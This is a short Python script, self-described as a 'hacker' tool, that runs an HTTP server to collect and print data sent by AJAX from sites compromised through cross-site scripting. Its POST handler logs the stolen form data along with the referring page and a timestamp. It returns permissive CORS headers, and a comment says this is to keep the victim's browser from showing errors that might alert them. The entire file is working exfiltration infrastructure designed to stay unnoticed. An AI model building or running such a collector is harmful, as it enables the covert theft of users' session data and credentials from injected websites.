#!/usr/bin/env python3
"""
Small 'hacker' script that prints certain values sent via AJAX requests
from XSSd sites.
"""
from http.server import (
    HTTPServer,
    BaseHTTPRequestHandler,
    )
import urllib
import datetime


class CustomRequestHandler(BaseHTTPRequestHandler):
    """
    Extend the Base handler to overrided do_POST
    """
    def do_POST(self):
        """
        Handle incoming data and print it to the console.
        Return 200 OK and CORS headers to prevent errors in the browser (this
        could alert the user that something is wrong).
        """
        length = int(self.headers['Content-Length'])
        content = self.rfile.read(length)
        data = urllib.parse.parse_qs(content.decode('utf-8'))
        print("Data sent from: {0} at {1}".format(
            self.headers['Referer'],
            datetime.datetime.now(),
            ))
        print(data)
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()


def main():
    server_class = HTTPServer
    handler_class = CustomRequestHandler
    server_address = ('', 8000)
    httpd = server_class(server_address, handler_class)
    httpd.serve_forever()


if __name__ == '__main__':
    main()

